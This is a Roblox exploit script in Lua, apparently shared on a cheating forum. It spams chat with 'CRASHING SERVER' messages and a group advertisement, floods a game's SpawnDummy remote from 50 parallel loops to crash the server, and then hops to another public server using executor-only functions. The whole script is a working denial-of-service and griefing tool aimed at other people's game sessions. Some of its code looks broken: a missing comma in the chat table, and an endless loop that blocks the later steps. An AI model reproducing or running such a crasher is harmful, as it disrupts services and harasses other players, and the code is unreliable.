-- thank you yo Joeengo on v3rm for making the crasher! im just making it chat and hop.

local chatTable = {
  "為大戟 CRASHING SERVER 我的家啊大家啊收到"
  "爲隊伍啊的 GOOPY.CLUB ON TOP! 地挖苦巨大的",
}

while wait(0.5) do
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatTable[math.random(1,2)], "All")
end

for i = 1, 50 do
   spawn(function()
       while wait() do
          game:GetService("ReplicatedStorage").SpawnDummy:FireServer()
       end
   end)    
end

wait(5)

local x = {}
	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
	if #x > 0 then
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
	end


game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.Started then
        syn.queue_on_teleport("")
    end
end)
